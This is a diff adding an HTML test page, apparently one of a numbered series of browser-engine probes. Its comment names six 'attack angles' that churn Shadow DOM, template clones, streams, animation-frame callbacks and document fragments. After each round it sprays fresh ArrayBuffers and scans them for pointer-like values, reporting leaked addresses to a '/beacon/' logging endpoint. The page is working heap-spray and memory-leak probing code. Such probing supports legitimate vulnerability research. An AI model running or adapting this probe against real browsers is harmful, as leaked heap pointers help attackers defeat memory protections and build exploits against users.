@@ -1,0 +1,383 @@
+<!--
+  p785: Shadow DOM / Template / Streams API / rAF callback residue
+
+  Shadow DOM: element.attachShadow({mode:'open'}) creates a C++
+  ShadowRoot object with its own node tree, style scope, and slot
+  distribution state. Each shadow root maintains a C++ StyleResolver
+  distinct from the document's. Attaching shadow roots to many
+  elements and populating them exercises the shadow tree allocator.
+  Removing the host element orphans the shadow root for GC.
+
+  Template: document.createElement('template') creates a C++
+  HTMLTemplateElement with an associated DocumentFragment
+  (content property). cloneNode(true) on a template deep-clones
+  the fragment's C++ node tree. Importing nodes across documents
+  via document.importNode exercises the node adoption allocator.
+
+  Streams API: new ReadableStream / WritableStream / TransformStream
+  create C++ stream objects with internal queues, controllers, and
+  reader/writer state. Piping and teeing allocate additional C++
+  state. Cancelling or erroring a stream frees internal buffers.
+
+  requestAnimationFrame: each rAF callback registers a C++
+  FrameCallback entry in the Document's animation frame list.
+  Bulk registration and cancellation exercises the callback list
+  allocator. The callback ID is an incrementing counter.
+
+  DocumentFragment: standalone fragment nodes used as temporary
+  containers. appendChild on a fragment moves all children in one
+  operation, exercising the C++ child list transfer path.
+
+  Attack angles:
+  A) Shadow DOM attach/populate/remove host churn.
+  B) Template deep clone / importNode churn.
+  C) ReadableStream/WritableStream create/cancel churn.
+  D) TransformStream pipe/tee churn.
+  E) requestAnimationFrame bulk register/cancel.
+  F) DocumentFragment bulk child transfer.
+
+  CRASH_CLASS: LOW (DOM/streams/rAF APIs, no side effects)
+  prior art: p774 (DOM traversal), p783 (Selection/Range)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p785</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p785-START');
+
+// === Section A: Shadow DOM attach/populate/remove host churn ===
+try{
+  b('A-shadow-dom');
+  var aHits=0;
+
+  var shadowSupported=false;
+  try{
+    var t=document.createElement('div');
+    if(t.attachShadow)shadowSupported=true;
+  }catch(e){}
+
+  if(!shadowSupported){
+    b('A-SKIP no attachShadow');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var hosts=[];
+        for(var i=0;i<50;i++){
+          var host=document.createElement('div');
+          document.body.appendChild(host);
+
+          var shadow=host.attachShadow({mode:'open'});
+
+          var style=document.createElement('style');
+          style.textContent=':host { display: block; } .inner { color: rgb('+(i*5)+','+(round*40)+',100); }';
+          shadow.appendChild(style);
+
+          for(var j=0;j<10;j++){
+            var el=document.createElement('div');
+            el.className='inner';
+            el.textContent='shadow_content_'+round+'_'+i+'_'+j;
+            el.setAttribute('data-idx',String(j));
+            shadow.appendChild(el);
+          }
+
+          var slot=document.createElement('slot');
+          slot.name='slot_'+i;
+          shadow.appendChild(slot);
+
+          hosts.push(host);
+        }
+
+        if(round===0){
+          b('A created '+hosts.length+' shadow hosts with 10 children + style + slot each');
+          b('A shadowRoot.childNodes='+hosts[0].shadowRoot.childNodes.length);
+        }
+
+        for(var i=0;i<hosts.length;i++){
+          document.body.removeChild(hosts[i]);
+        }
+        hosts=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Template deep clone / importNode churn ===
+try{
+  b('B-template');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var templates=[];
+      for(var i=0;i<30;i++){
+        var tmpl=document.createElement('template');
+        var content=tmpl.content;
+
+        for(var j=0;j<15;j++){
+          var div=document.createElement('div');
+          div.className='tmpl_item_'+j;
+          div.setAttribute('data-round',String(round));
+          div.setAttribute('data-template',String(i));
+          div.textContent='template_content_'+round+'_'+i+'_'+j+'_'+'t'.repeat(20);
+
+          var child=document.createElement('span');
+          child.textContent='nested_'+j;
+          div.appendChild(child);
+
+          content.appendChild(div);
+        }
+        templates.push(tmpl);
+      }
+
+      if(round===0)b('B created '+templates.length+' templates with 15 children each');
+
+      var clones=[];
+      for(var i=0;i<templates.length;i++){
+        for(var c=0;c<5;c++){
+          var clone=templates[i].content.cloneNode(true);
+          clones.push(clone);
+        }
+      }
+
+      if(round===0)b('B cloned '+clones.length+' deep copies');
+
+      var imports=[];
+      for(var i=0;i<Math.min(20,clones.length);i++){
+        try{
+          var imported=document.importNode(clones[i],true);
+          imports.push(imported);
+        }catch(e){
+          if(i===0&&round===0)b('B import_err='+e.message);
+        }
+      }
+
+      templates=null;clones=null;imports=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: ReadableStream/WritableStream create/cancel ===
+try{
+  b('C-streams');
+  var cHits=0;
+
+  var rsSupported=typeof ReadableStream!=='undefined';
+  var wsSupported=typeof WritableStream!=='undefined';
+
+  if(!rsSupported){
+    b('C-SKIP no ReadableStream');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var streams=[];
+
+        for(var i=0;i<40;i++){
+          try{
+            var rs=new ReadableStream({
+              start:function(controller){
+                for(var j=0;j<5;j++){
+                  controller.enqueue('chunk_'+round+'_'+i+'_'+j+'_'+'d'.repeat(30));
+                }
+                controller.close();
+              }
+            });
+            streams.push(rs);
+          }catch(e){
+            if(i===0&&round===0)b('C rs_err='+e.message);
+          }
+        }
+
+        if(wsSupported){
+          for(var i=0;i<20;i++){
+            try{
+              var ws=new WritableStream({
+                write:function(chunk){},
+                close:function(){},
+                abort:function(reason){}
+              });
+              streams.push(ws);
+            }catch(e){
+              if(i===0&&round===0)b('C ws_err='+e.message);
+            }
+          }
+        }
+
+        if(round===0)b('C created '+streams.length+' streams (readable+writable)');
+
+        for(var i=0;i<streams.length;i++){
+          try{
+            if(streams[i].cancel)streams[i].cancel('done_'+round);
+          }catch(e){}
+        }
+        streams=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[48,64,96,128]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: TransformStream pipe/tee ===
+try{
+  b('D-transform');
+  var dHits=0;
+
+  var tsSupported=typeof TransformStream!=='undefined';
+  if(!tsSupported){
+    b('D-SKIP no TransformStream');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var transforms=[];
+
+        for(var i=0;i<30;i++){
+          try{
+            var ts=new TransformStream({
+              transform:function(chunk,controller){
+                controller.enqueue(chunk+'_transformed');
+              }
+            });
+            transforms.push(ts);
+          }catch(e){
+            if(i===0&&round===0)b('D ts_err='+e.message);
+          }
+        }
+
+        if(round===0)b('D created '+transforms.length+' TransformStreams');
+
+        for(var i=0;i<transforms.length;i++){
+          try{
+            var readable=transforms[i].readable;
+            if(readable.tee){
+              var branches=readable.tee();
+              try{branches[0].cancel();}catch(e){}
+              try{branches[1].cancel();}catch(e){}
+            }else{
+              readable.cancel();
+            }
+          }catch(e){}
+        }
+        transforms=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: requestAnimationFrame bulk register/cancel ===
+try{
+  b('E-raf');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var ids=[];
+      for(var i=0;i<500;i++){
+        var id=requestAnimationFrame(function(){});
+        ids.push(id);
+      }
+
+      if(round===0){
+        b('E registered '+ids.length+' rAF callbacks');
+        b('E id_range='+ids[0]+'-'+ids[ids.length-1]);
+      }
+
+      for(var i=0;i<ids.length;i++){
+        cancelAnimationFrame(ids[i]);
+      }
+      ids=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: DocumentFragment bulk child transfer ===
+try{
+  b('F-fragment');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var fragments=[];
+      for(var i=0;i<50;i++){
+        var frag=document.createDocumentFragment();
+        for(var j=0;j<30;j++){
+          var el=document.createElement('div');
+          el.textContent='frag_'+round+'_'+i+'_'+j;
+          el.setAttribute('data-frag',String(i));
+          el.className='frag_child_'+j;
+          frag.appendChild(el);
+        }
+        fragments.push(frag);
+      }
+
+      if(round===0)b('F created '+fragments.length+' fragments with 30 children each');
+
+      var container=document.createElement('div');
+      document.body.appendChild(container);
+
+      for(var i=0;i<fragments.length;i++){
+        container.appendChild(fragments[i]);
+      }
+
+      if(round===0)b('F container.children='+container.children.length+' after transfer');
+
+      document.body.removeChild(container);
+      fragments=null;container=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p785-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
